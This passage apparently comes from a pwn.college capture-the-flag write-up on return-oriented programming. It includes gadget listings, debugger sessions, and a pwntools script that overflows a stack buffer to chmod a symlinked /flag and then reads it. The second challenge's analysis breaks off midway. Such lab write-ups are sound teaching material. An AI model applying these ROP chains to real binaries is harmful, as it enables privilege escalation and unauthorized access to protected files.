0x00000000004021db : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011b0 : endbr64 ; jmp 0x401140
0x0000000000401100 : endbr64 ; ret
0x000000000040203d : fadd dword ptr [r9 + 0x5a] ; ret
0x000000000040203e : fadd dword ptr [rcx + 0x5a] ; ret
0x00000000004021ac : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010fe : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401125 : je 0x401130 ; mov edi, 0x405050 ; jmp rax
0x0000000000401167 : je 0x401170 ; mov edi, 0x405050 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011b4 : jmp 0x401140
0x000000000040100b : jmp 0x4840104f
0x000000000040112c : jmp rax
0x000000000040209b : leave ; ret
0x000000000040112d : loopne 0x401195 ; nop ; ret
0x0000000000402036 : loopne 0x402092 ; ret
0x0000000000401196 : mov byte ptr [rip + 0x3ecb], 1 ; pop rbp ; ret
0x0000000000402054 : mov dword ptr [rbp - 0x40], 0xc35941 ; nop ; pop rbp ; ret
0x000000000040214e : mov eax, 0 ; leave ; ret
0x0000000000401127 : mov edi, 0x405050 ; jmp rax
0x00000000004010ff : nop ; endbr64 ; ret
0x000000000040209a : nop ; leave ; ret
0x0000000000402009 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200a : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200b : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200c : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200d : nop ; nop ; nop ; nop ; pop rbp ; ret
0x000000000040200e : nop ; nop ; nop ; pop rbp ; ret
0x000000000040200f : nop ; nop ; pop rbp ; ret
0x0000000000402010 : nop ; pop rbp ; ret
0x000000000040112f : nop ; ret
0x00000000004011ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401140
0x0000000000401126 : or dword ptr [rdi + 0x405050], edi ; jmp rax
0x000000000040203f : pop r10 ; ret
0x00000000004021bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004021be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004021c0 : pop r14 ; pop r15 ; ret
0x00000000004021c2 : pop r15 ; ret
0x000000000040201f : pop r8 ; ret
0x0000000000402057 : pop r9 ; ret
0x0000000000402020 : pop rax ; ret
0x00000000004021bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004021bf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040119d : pop rbp ; ret
0x0000000000402058 : pop rcx ; ret
0x0000000000402047 : pop rdi ; ret
0x0000000000402037 : pop rdx ; ret
0x00000000004021c1 : pop rsi ; pop r15 ; ret
0x0000000000402027 : pop rsi ; ret
0x00000000004021bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401129 : push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401128 : push rax ; push rax ; add dil, dil ; loopne 0x401195 ; nop ; ret
0x000000000040101a : ret
0x0000000000401198 : retf
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004021dd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004021dc : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040204f : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401123 : test eax, eax ; je 0x401130 ; mov edi, 0x405050 ; jmp rax
0x0000000000401165 : test eax, eax ; je 0x401170 ; mov edi, 0x405050 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 93
```

### ROP chain: ret2stack

The ROP chain will be the same as the [easy version](#rop-chain-ret2stack-2).

### Exploit

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initialize values
pop_rax = 0x402020
pop_rdi = 0x402047
pop_rsi_pop_r15 = 0x4021c1
syscall = 0x40204f
bang_addr = 0x403030

buffer_addr = 0x7ffdc51a0330
ret_addr = 0x7ffdc51a0378

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop2-hard')

# Craft payload
payload = flat(
    b"A" * offset,

    # chmod("!", 0o777)
    pop_rdi, bang_addr,
    pop_rsi_pop_r15, 0o777, b"B" * 8,
    pop_rax, 90,
    syscall
)

# Send the payload
p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop2-hard': pid 13446
[*] Switching to interactive mode
[*] Process '/challenge/stop-pop-and-rop2-hard' stopped with exit code -11 (SIGSEGV) (pid 13446)
###
### Welcome to /challenge/stop-pop-and-rop2-hard!
###

Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ cat /flag 
pwn.college{0dY0MtDlT_gkfSSrek3AId3RaXP.0FM1MDL4ITM0EzW}
```

&nbsp;

## Indirect Invocation (Easy)

```
hacker@return-oriented-programming~indirect-invocation-easy:~$ /challenge/indirect-invocation-easy 
###
### Welcome to /challenge/indirect-invocation-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

```

This time there is no `syscall` gadget. 

### Binary Analysis

Let's look at what gadgets are there.

#### ROP gadgets

```
hacker@return-oriented-programming~indirect-invocation-easy:/$ ROPgadget --binary /challenge/indirect-invocation-easy 
Gadgets information
============================================================
0x00000000004016c7 : adc eax, 0xc9fffffb ; ret
0x000000000040121d : add ah, dh ; nop ; endbr64 ; ret
0x000000000040124b : add bh, bh ; loopne 0x4012b5 ; nop ; ret
0x00000000004022f5 : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000402345 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x00000000004015af : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
0x0000000000402299 : add byte ptr [rax - 0x39], cl ; loopne 0x4022fe ; ret
0x0000000000401544 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401542 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401332 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004024ec : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401334 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004015b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
0x000000000040167f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
0x00000000004016fd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
0x0000000000402478 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000402479 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004012ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004024ee : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040121c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401336 : add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004015b6 : add byte ptr [rax], al ; jmp 0x401648
0x0000000000401681 : add byte ptr [rax], al ; jmp 0x4016af
0x00000000004016ff : add byte ptr [rax], al ; jmp 0x401726
0x000000000040247a : add byte ptr [rax], al ; leave ; ret
0x00000000004022a0 : add byte ptr [rax], al ; nop ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004012bb : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040247b : add cl, cl ; ret
0x000000000040124a : add dil, dil ; loopne 0x4012b5 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004012bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040132f : add eax, 0x3d88 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004012b7 : add eax, 0x3dfb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000402352 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000402276 : call qword ptr [rax + 0xff3c35d]
0x0000000000401737 : call qword ptr [rax + 0xff3c3c9]
0x00000000004014cc : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004015b3 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401648
0x0000000000402285 : clc ; pop rcx ; ret
0x00000000004016fc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
0x00000000004012d3 : cli ; jmp 0x401260
0x0000000000401223 : cli ; ret
0x00000000004022f2 : cli ; sub eax, 0x29480000 ; ret 0x8948
0x00000000004024fb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401331 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x4014b0
0x00000000004012b9 : cmp eax, 0x5d010000 ; ret
0x000000000040121b : cmp eax, 0x90f40000 ; endbr64 ; ret
0x0000000000401248 : cwde ; push rax ; add dil, dil ; loopne 0x4012b5 ; nop ; ret
0x00000000004016ca : dec ecx ; ret
0x00000000004012d0 : endbr64 ; jmp 0x401260
0x0000000000401220 : endbr64 ; ret
0x00000000004024cc : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040167e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
0x000000000040121e : hlt ; nop ; endbr64 ; ret
0x00000000004024aa : in al, dx ; or al, ch ; jmp 0x4024af
0x00000000004016f9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401726
0x000000000040167b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016af
0x0000000000401547 : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401245 : je 0x401250 ; mov edi, 0x405098 ; jmp rax
0x0000000000401287 : je 0x401290 ; mov edi, 0x405098 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004012d4 : jmp 0x401260
0x0000000000401338 : jmp 0x4014b0
0x00000000004015b8 : jmp 0x401648
0x0000000000401683 : jmp 0x4016af
0x0000000000401669 : jmp 0x4016b5
0x000000000040150f : jmp 0x4016cb
0x0000000000401701 : jmp 0x401726
0x00000000004024ae : jmp 0x4024af
0x000000000040100b : jmp 0x4840104f
0x000000000040124c : jmp rax
0x00000000004014cf : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004016cb : leave ; ret
0x000000000040124d : loopne 0x4012b5 ; nop ; ret
0x000000000040229d : loopne 0x4022fe ; ret
0x00000000004012b6 : mov byte ptr [rip + 0x3dfb], 1 ; pop rbp ; ret
0x0000000000401330 : mov byte ptr [rip], bh ; add byte ptr [rax], al ; jmp 0x4014b0
0x000000000040229b : mov dword ptr [rbp - 0x20], 0xc35f ; nop ; pop rbp ; ret
0x000000000040167c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x4016af
0x00000000004016fa : mov dword ptr [rbp - 4], 0 ; jmp 0x401726
0x00000000004015b1 : mov dword ptr [rbp - 8], 0 ; jmp 0x401648
0x0000000000402477 : mov eax, 0 ; leave ; ret
0x0000000000401247 : mov edi, 0x405098 ; jmp rax
0x00000000004015b0 : mov qword ptr [rbp - 8], 0 ; jmp 0x401648
0x0000000000402342 : movabs byte ptr [0x8948d1294800002d], al ; retf 0x148
0x000000000040121f : nop ; endbr64 ; ret
0x0000000000401738 : nop ; leave ; ret
0x0000000000402251 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402252 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402253 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402254 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402255 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000402256 : nop ; nop ; nop ; pop rbp ; ret
0x0000000000402257 : nop ; nop ; pop rbp ; ret
0x0000000000402258 : nop ; pop rbp ; ret
0x000000000040124f : nop ; ret
0x00000000004012cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401260
0x00000000004024ab : or al, ch ; jmp 0x4024af
0x0000000000401246 : or dword ptr [rdi + 0x405098], edi ; jmp rax
0x0000000000401105 : or eax, 0xf2000000 ; jmp 0x401020
0x00000000004024dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014d3 : pop r12 ; pop r13 ; pop rbp ; ret
0x00000000004024de : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014d5 : pop r13 ; pop rbp ; ret
0x00000000004024e0 : pop r14 ; pop r15 ; ret
0x00000000004024e2 : pop r15 ; ret
0x00000000004024db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004024df : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004014d6 : pop rbp ; pop rbp ; ret
0x00000000004012bd : pop rbp ; ret
0x00000000004014d2 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000402286 : pop rcx ; ret
0x000000000040229e : pop rdi ; ret
0x000000000040228e : pop rdx ; ret
0x00000000004024e1 : pop rsi ; pop r15 ; ret
0x0000000000402296 : pop rsi ; ret
0x00000000004024dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014d4 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401249 : push rax ; add dil, dil ; loopne 0x4012b5 ; nop ; ret
0x0000000000402390 : push rsp ; sub eax, 0x29480000 ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040101a : ret
0x000000000040153f : ret 0x40be
0x0000000000402355 : ret 0x458b
0x00000000004022f8 : ret 0x8948
0x00000000004023a5 : ret 0x8b48
0x00000000004014ef : ret 0x8be
0x0000000000402319 : retf
0x000000000040234b : retf 0x148
0x00000000004023a2 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000402348 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004012b8 : sti ; cmp eax, 0x5d010000 ; ret
0x00000000004022f3 : sub eax, 0x29480000 ; ret 0x8948
0x0000000000402343 : sub eax, 0x29480000 ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x00000000004024fd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004024fc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401243 : test eax, eax ; je 0x401250 ; mov edi, 0x405098 ; jmp rax
0x0000000000401285 : test eax, eax ; je 0x401290 ; mov edi, 0x405098 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 149
```

We still have the classic `pop` gadgets which set the values of registers. So we can still set up a syscall.

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Locations of required PLT stubs
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

As for the invocation of the syscall, even if we cannot directly do it, we can leverage the PLT stubs which are present in the binary.

#### PLT stubs

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401110  putchar@plt
0x0000000000401120  __errno_location@plt
0x0000000000401130  puts@plt
0x0000000000401140  cs_free@plt
0x0000000000401150  printf@plt
0x0000000000401160  read@plt
0x0000000000401170  strcmp@plt
0x0000000000401180  cs_disasm@plt
0x0000000000401190  mincore@plt
0x00000000004011a0  sendfile@plt
0x00000000004011b0  setvbuf@plt
0x00000000004011c0  cs_open@plt
0x00000000004011d0  open@plt
0x00000000004011e0  cs_close@plt
0x00000000004011f0  _start
0x0000000000401220  _dl_relocate_static_pie
0x0000000000401230  deregister_tm_clones
0x0000000000401260  register_tm_clones
0x00000000004012a0  __do_global_dtors_aux
0x00000000004012d0  frame_dummy
0x00000000004012d6  DUMP_STACK
0x00000000004014d9  print_gadget
0x00000000004016cd  print_chain
0x000000000040173b  bin_padding
0x000000000040225b  force_import
0x000000000040227a  free_gadgets
0x00000000004022a5  challenge
0x00000000004023c6  main
0x0000000000402480  __libc_csu_init
0x00000000004024f0  __libc_csu_fini
0x00000000004024f8  _fini
```

We can use the `open@plt`, `read@plt` and `puts@plt`.

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004022a5 <+0>:     endbr64
   0x00000000004022a9 <+4>:     push   rbp
   0x00000000004022aa <+5>:     mov    rbp,rsp
   0x00000000004022ad <+8>:     sub    rsp,0x70
   0x00000000004022b1 <+12>:    mov    DWORD PTR [rbp-0x54],edi
   0x00000000004022b4 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004022b8 <+19>:    mov    QWORD PTR [rbp-0x68],rdx
   0x00000000004022bc <+23>:    lea    rdi,[rip+0xed5]        # 0x403198
   0x00000000004022c3 <+30>:    call   0x401130 <puts@plt>
   0x00000000004022c8 <+35>:    lea    rdi,[rip+0xf41]        # 0x403210
   0x00000000004022cf <+42>:    call   0x401130 <puts@plt>
   0x00000000004022d4 <+47>:    mov    rax,rsp
   0x00000000004022d7 <+50>:    mov    QWORD PTR [rip+0x2e12],rax        # 0x4050f0 <sp_>
   0x00000000004022de <+57>:    mov    rax,rbp
   0x00000000004022e1 <+60>:    mov    QWORD PTR [rip+0x2de8],rax        # 0x4050d0 <bp_>
   0x00000000004022e8 <+67>:    mov    rdx,QWORD PTR [rip+0x2de1]        # 0x4050d0 <bp_>
   0x00000000004022ef <+74>:    mov    rax,QWORD PTR [rip+0x2dfa]        # 0x4050f0 <sp_>
   0x00000000004022f6 <+81>:    sub    rdx,rax
   0x00000000004022f9 <+84>:    mov    rax,rdx
   0x00000000004022fc <+87>:    shr    rax,0x3
   0x0000000000402300 <+91>:    add    rax,0x2
   0x0000000000402304 <+95>:    mov    QWORD PTR [rip+0x2dd5],rax        # 0x4050e0 <sz_>
   0x000000000040230b <+102>:   mov    rax,QWORD PTR [rip+0x2dbe]        # 0x4050d0 <bp_>
   0x0000000000402312 <+109>:   add    rax,0x8
   0x0000000000402316 <+113>:   mov    QWORD PTR [rip+0x2dcb],rax        # 0x4050e8 <rp_>
   0x000000000040231d <+120>:   lea    rax,[rbp-0x50]
   0x0000000000402321 <+124>:   mov    edx,0x1000
   0x0000000000402326 <+129>:   mov    rsi,rax
   0x0000000000402329 <+132>:   mov    edi,0x0
   0x000000000040232e <+137>:   call   0x401160 <read@plt>
   0x0000000000402333 <+142>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402336 <+145>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402339 <+148>:   cdqe
   0x000000000040233b <+150>:   lea    rcx,[rbp-0x50]
   0x000000000040233f <+154>:   mov    rdx,QWORD PTR [rip+0x2da2]        # 0x4050e8 <rp_>
   0x0000000000402346 <+161>:   sub    rcx,rdx
   0x0000000000402349 <+164>:   mov    rdx,rcx
   0x000000000040234c <+167>:   add    rax,rdx
   0x000000000040234f <+170>:   shr    rax,0x3
   0x0000000000402353 <+174>:   mov    rdx,rax
   0x0000000000402356 <+177>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402359 <+180>:   mov    esi,eax
   0x000000000040235b <+182>:   lea    rdi,[rip+0xf16]        # 0x403278
   0x0000000000402362 <+189>:   mov    eax,0x0
   0x0000000000402367 <+194>:   call   0x401150 <printf@plt>
   0x000000000040236c <+199>:   lea    rdi,[rip+0xf3d]        # 0x4032b0
   0x0000000000402373 <+206>:   call   0x401130 <puts@plt>
   0x0000000000402378 <+211>:   lea    rdi,[rip+0xf99]        # 0x403318
   0x000000000040237f <+218>:   call   0x401130 <puts@plt>
   0x0000000000402384 <+223>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402387 <+226>:   cdqe
   0x0000000000402389 <+228>:   lea    rcx,[rbp-0x50]
   0x000000000040238d <+232>:   mov    rdx,QWORD PTR [rip+0x2d54]        # 0x4050e8 <rp_>
   0x0000000000402394 <+239>:   sub    rcx,rdx
   0x0000000000402397 <+242>:   mov    rdx,rcx
   0x000000000040239a <+245>:   add    rax,rdx
   0x000000000040239d <+248>:   shr    rax,0x3
   0x00000000004023a1 <+252>:   add    eax,0x1
   0x00000000004023a4 <+255>:   mov    edx,eax
   0x00000000004023a6 <+257>:   mov    rax,QWORD PTR [rip+0x2d3b]        # 0x4050e8 <rp_>
   0x00000000004023ad <+264>:   mov    esi,edx
   0x00000000004023af <+266>:   mov    rdi,rax
   0x00000000004023b2 <+269>:   call   0x4016cd <print_chain>
   0x00000000004023b7 <+274>:   lea    rdi,[rip+0xf9c]        # 0x40335a
   0x00000000004023be <+281>:   call   0x401130 <puts@plt>
   0x00000000004023c3 <+286>:   nop
   0x00000000004023c4 <+287>:   leave
   0x00000000004023c5 <+288>:   ret
End of assembler dump.
```

We can set a breakpoint at `challenge+137` and run.

```
pwndbg> break *(challenge+137)
Breakpoint 1 at 0x40232e
```

```
pwndbg> run
Starting program: /challenge/indirect-invocation-easy 
###
### Welcome to /challenge/indirect-invocation-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!


Breakpoint 1, 0x000000000040232e in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7ffcd4fe1ae0 ◂— 0
 RBX  0x402480 (__libc_csu_init) ◂— endbr64 
 RCX  0x71c72cf3b297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7ffcd4fe1ae0 ◂— 0
 R8   0x61
 R9   0x34
 R10  0x4005ec ◂— 0x72616863747570 /* 'putchar' */
 R11  0x246
 R12  0x4011f0 (_start) ◂— endbr64 
 R13  0x7ffcd4fe1c50 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffcd4fe1b30 —▸ 0x7ffcd4fe1b60 ◂— 0
 RSP  0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RIP  0x40232e (challenge+137) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x40232e <challenge+137>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7ffcd4fe1ae0 ◂— 0
        nbytes: 0x1000
 
   0x402333 <challenge+142>    mov    dword ptr [rbp - 4], eax
   0x402336 <challenge+145>    mov    eax, dword ptr [rbp - 4]
   0x402339 <challenge+148>    cdqe   
   0x40233b <challenge+150>    lea    rcx, [rbp - 0x50]
   0x40233f <challenge+154>    mov    rdx, qword ptr [rip + 0x2da2]     RDX, [rp_]
   0x402346 <challenge+161>    sub    rcx, rdx
   0x402349 <challenge+164>    mov    rdx, rcx
   0x40234c <challenge+167>    add    rax, rdx
   0x40234f <challenge+170>    shr    rax, 3
   0x402353 <challenge+174>    mov    rdx, rax
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffcd4fe1ac0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-068     0x7ffcd4fe1ac8 —▸ 0x7ffcd4fe1c68 —▸ 0x7ffcd4fe2681 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffcd4fe1ad0 —▸ 0x7ffcd4fe1c58 —▸ 0x7ffcd4fe265d ◂— '/challenge/indirect-invocation-easy'
03:0018│-058     0x7ffcd4fe1ad8 ◂— 0x100000000
04:0020│ rax rsi 0x7ffcd4fe1ae0 ◂— 0
05:0028│-048     0x7ffcd4fe1ae8 —▸ 0x71c72cebde93 (_IO_file_overflow+275) ◂— cmp eax, -1
06:0030│-040     0x7ffcd4fe1af0 —▸ 0x71c72d01a6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-038     0x7ffcd4fe1af8 ◂— 0xa /* '\n' */
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40232e challenge+137
   1         0x40246b main+165
   2   0x71c72ce51083 __libc_start_main+243
   3         0x40121e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Lets get the address of the stored return pointer.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffcd4fe1b40:
 rip = 0x40232e in challenge; saved rip = 0x40246b
 called by frame at 0x7ffcd4fe1b70
 Arglist at 0x7ffcd4fe1b30, args: 
 Locals at 0x7ffcd4fe1b30, Previous frame's sp is 0x7ffcd4fe1b40
 Saved registers:
  rbp at 0x7ffcd4fe1b30, rip at 0x7ffcd4fe1b38
```

Now we can calculate the offset.

```
pwndbg> p/d 0x7ffcd4fe1b38 - 0x7ffcd4fe1ae0
$1 = 88
```

- [x] Offset between buffer and stored return address to `main()`: `88`
   - Buffer address: `0x7ffcd4fe1ae0`
   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
- [ ] Location of a NULL terminated string
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

Let's find a string we can use a symlink.

```
hacker@return-oriented-programming~indirect-invocation-easy:/$ objdump -s -j .rodata /challenge/indirect-invocation-easy | grep -E "[0-9a-f]{2}00"
 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
 403200 20746869 73207365 72696573 206f6600   this series of.
 403270 00000000 00000000 52656365 69766564  ........Received
 4032a0 64206761 64676574 732e0a00 00000000  d gadgets.......
 403300 67657473 20617265 20657865 63757461  gets are executa
 403310 626c6500 00000000 66726f6d 20776974  ble.....from wit
 403350 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
 403360 67210023 23230023 23232057 656c636f  g!.###.### Welco
 403370 6d652074 6f202573 210a0023 23232047  me to %s!..### G
 403380 6f6f6462 79652100                    oodbye!.
```

- [x] Offset between buffer and stored return address to `main()`: `88`
   - Buffer address: `0x7ffcd4fe1ae0`
   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
- [x] Location of a NULL terminated string: `0x403386`
- [x] Locations of required PLT stubs
   - `open@plt`: `0x4011d0`
   - `read@plt`: `0x401160`
   - `puts@plt`: `0x401130`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x40229e`
   - `pop rsi ; ret`: `0x402296`
   - `pop rdx ; ret`: `0x40228e`
- [ ] Location to which flag is to be read

Let's get the address of the `.bss` section so that we can read the flag.

```
pwndbg> info files
Symbols from "/challenge/indirect-invocation-easy".
Local exec file:
        `/challenge/indirect-invocation-easy', file type elf64-x86-64.
        Entry point: 0x4011f0
        0x0000000000400318 - 0x0000000000400334 is .interp
        0x0000000000400338 - 0x0000000000400358 is .note.gnu.property
        0x0000000000400358 - 0x000000000040037c is .note.gnu.build-id
